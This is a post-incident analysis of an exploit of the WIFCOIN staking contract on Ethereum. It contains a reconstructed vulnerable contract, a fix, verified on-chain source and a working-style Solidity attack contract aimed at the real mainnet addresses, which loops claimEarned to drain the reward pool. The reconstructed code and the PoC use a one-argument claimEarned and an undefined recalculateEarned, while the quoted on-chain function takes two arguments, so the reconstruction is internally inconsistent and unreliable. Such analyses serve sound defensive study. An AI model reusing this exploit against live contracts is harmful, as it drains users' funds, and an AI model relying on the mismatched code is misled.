# WIFCOIN — claimEarned() burnRate Repeated-Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-06 |
| **Protocol** | WIFCOIN |
| **Chain** | Ethereum |
| **Loss** | ~3.4 ETH |
| **WIF Staking** | [0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99](https://etherscan.io/address/0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99) |
| **WIF Token** | [0xBFae33128ecF041856378b57adf0449181FFFDE7](https://etherscan.io/address/0xBFae33128ecF041856378b57adf0449181FFFDE7) |
| **Attacker** | [0x394ba273315240510b61ca22ba152e3478a45892](https://etherscan.io/address/0x394ba273315240510b61ca22ba152e3478a45892) |
| **Attack Contract** | [0x93d4f6f84d242c7959f8d1f1917ddbc9fb925ada](https://etherscan.io/address/0x93d4f6f84d242c7959f8d1f1917ddbc9fb925ada) |
| **Root Cause** | `claimEarned(uint256 burnRate)` can be called repeatedly with the same burnRate=10 until the reward balance is exhausted; staking state is not invalidated after withdrawal, so residual rewards are continuously paid out on every call |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-06/WIFCOIN_ETH_exp.sol) |

---

## 1. Vulnerability Overview

The `claimEarned(uint256 burnRate)` function in the WIFCOIN staking contract is a mechanism that burns a portion of rewards and distributes the remainder according to a burnRate parameter (0–100). This function can be called repeatedly without any call-count limit or cooldown. By repeatedly calling it with burnRate=10 (10% burned, 90% distributed) until the staking pool is drained, the attacker stole approximately 3.4 ETH worth of WIF. The attack was executed purely through direct ETH balance manipulation, with no flash loan required.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no restriction on repeated claimEarned calls
contract WIFStaking {
    mapping(address => uint256) public stakedBalance;
    mapping(address => uint256) public earnedRewards;
    mapping(address => uint256) public lastClaimTime;

    function stake(uint256 amount) external {
        stakedBalance[msg.sender] += amount;
        WIF.transferFrom(msg.sender, address(this), amount);
    }

    // burnRate: 0~100 (burn percentage %)
    function claimEarned(uint256 burnRate) external {
        uint256 earned = earnedRewards[msg.sender];
        require(earned > 0, "nothing to claim");

        uint256 burnAmount = earned * burnRate / 100;
        uint256 claimAmount = earned - burnAmount;

        // ❌ No call-interval restriction — repeated calls possible
        // ❌ earnedRewards not reset to 0; can be recalculated on every call
        earnedRewards[msg.sender] = recalculateEarned(msg.sender); // recalculation bug

        if (burnAmount > 0) WIF.transfer(address(0), burnAmount);
        WIF.transfer(msg.sender, claimAmount);
    }
}

// ✅ Safe code
function claimEarned(uint256 burnRate) external {
    require(burnRate <= 100, "invalid burn rate");
    uint256 earned = earnedRewards[msg.sender];
    require(earned > 0, "nothing to claim");

    // CEI: reset state first
    earnedRewards[msg.sender] = 0;
    lastClaimTime[msg.sender] = block.timestamp;

    uint256 burnAmount = earned * burnRate / 100;
    uint256 claimAmount = earned - burnAmount;

    if (burnAmount > 0) WIF.transfer(address(0xdead), burnAmount);
    WIF.transfer(msg.sender, claimAmount);
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: WIFStaking.sol
    function claimEarned(uint256 _stakingId, uint256 _burnRate) public override {  // ❌ Vulnerability
        require(_burnRate == 10 || _burnRate == 25 || _burnRate == 40, "Invalid burn rate");

        uint256 _earned = 0;
        Plan storage plan = plans[_stakingId];

        require(stakes[_stakingId][msg.sender].length > 0, "No stakes found");

        for (uint256 i = 0; i < stakes[_stakingId][msg.sender].length; i++) {
            Staking storage _staking = stakes[_stakingId][msg.sender][i];
            _earned = _earned.add(
                _staking
                    .amount
                    .mul(plan.apr)
                    .div(10000)
            );

            totalRewards = totalRewards.add(_earned);
            totalRewardsPerPlan[_stakingId] = totalRewardsPerPlan[_stakingId].add(_earned);

            totalRewardsPerWalletPerPlan[_stakingId][msg.sender] = totalRewardsPerWalletPerPlan[_stakingId][msg.sender].add(_earned);

            totalEarnedRewardsPerWallet[msg.sender] += _earned;
        
            _staking.stakeAt = block.timestamp;
        }

        require(_earned > 0, "There is no amount to claim");

        uint256 burnAmount = _earned.mul(_burnRate).div(100);
        IERC20(stakingToken).transfer(BURN_ADDRESS, burnAmount);
        IERC20(stakingToken).transfer(msg.sender, _earned.sub(burnAmount));
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] 0.3 ETH → WIF swap (Uniswap V2)
  │
  ├─→ [2] WIFStaking.stake(wifBalance) — staking ID: 3
  │         └─ stakedBalance[attacker] = wifBal
  │         └─ earnedRewards begins accumulating
  │
  ├─→ [3] claimEarned(10) repeated calls (until revert)
  │         └─ burnRate=10 → 90% distributed, 10% burned
  │         └─ No call-interval restriction
  │         └─ earnedRewards recalculation bug → rewards re-issued on every call
  │         └─ Automatically stops when staking pool balance is exhausted
  │
  ├─→ [4] Remaining WIF → ETH reverse swap (Uniswap V2)
  │
  └─→ [5] Net profit ~3.4 ETH (vs. initial 0.3 ETH investment)
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IWIFStaking {
    function stake(uint256 amount) external;
    function claimEarned(uint256 burnRate) external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

contract AttackContract {
    IWIFStaking constant staking = IWIFStaking(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99);
    IERC20 constant WIF = IERC20(0xBFae33128ecF041856378b57adf0449181FFFDE7);
    IUniswapV2Router constant router = IUniswapV2Router(UNISWAP_V2_ROUTER);

    function testExploit() external payable {
        // [1] Swap 0.3 ETH → WIF
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(WIF);
        router.swapExactETHForTokens{value: 0.3 ether}(0, path, address(this), block.timestamp);

        // [2] Stake entire WIF balance
        uint256 wifBal = WIF.balanceOf(address(this));
        WIF.approve(address(staking), wifBal);
        staking.stake(wifBal); // staking ID: 3

        // [3] Repeat claimEarned(10) — until revert
        while (true) {
            try staking.claimEarned(10) {
                // Receive 90% reward, burn 10% on every call
            } catch {
                break; // Stop when pool is drained or earnedRewards=0
            }
        }

        // [4] Swap acquired WIF back to ETH
        uint256 finalWif = WIF.balanceOf(address(this));
        WIF.approve(address(router), finalWif);
        address[] memory path2 = new address[](2);
        path2[0] = address(WIF);
        path2[1] = WETH;
        router.swapExactTokensForETH(finalWif, 0, path2, address(this), block.timestamp);
        // Net profit ~3.4 ETH
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Staking reward repeated claiming (claimEarned with no cooldown) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (repeated claimEarned calls, no flash loan required) |
| **DApp Category** | Token staking reward contract |
| **Impact** | Reward pool drained (~3.4 ETH) |

## 6. Remediation Recommendations

1. **CEI Pattern**: Execute `earnedRewards[msg.sender] = 0` before any token transfer
2. **Claim Cooldown**: Allow re-claiming from the same address only after a minimum interval (e.g., 1 block)
3. **Fix Recalculation Bug**: Reset rewards to 0 after claiming and remove the recalculation logic
4. **Maximum Claim Cap**: Limit the maximum claimable amount per single transaction

## 7. Lessons Learned

- Performing a recalculation of `earnedRewards` before resetting it to 0 in a reward-claim function violates the CEI (Checks-Effects-Interactions) pattern, enabling repeated claiming.
- As with JokInTheBox (2024-06), the missing state invalidation is the core vulnerability, and a profitable attack is possible even without a flash loan.
- With a partial burn mechanism using the burnRate parameter, the attack is viable whenever the gain from each repeated claim exceeds the burn loss incurred per call.